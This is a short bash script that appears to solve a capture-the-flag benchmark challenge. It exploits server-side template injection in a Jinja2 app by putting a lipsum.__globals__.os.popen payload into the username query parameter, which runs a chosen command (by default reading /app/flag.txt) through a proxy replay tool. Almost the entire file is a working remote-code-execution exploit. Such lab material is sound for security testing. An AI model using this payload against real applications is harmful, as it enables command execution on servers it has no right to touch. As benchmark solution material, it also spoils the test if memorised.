#!/usr/bin/env bash
# XBEN-053-24 — Jinja2 SSTI to RCE via the username query parameter. Proxy-mode
# twin. The index renders `username` as a template; the lipsum gadget runs
# `cat /app/flag.txt`.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
COMMAND="${2:-cat /app/flag.txt}"
SESSION="xben053p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/' \
  --set "query.username={{lipsum.__globals__.os.popen('$COMMAND').read()}}" >/dev/null
print_flag
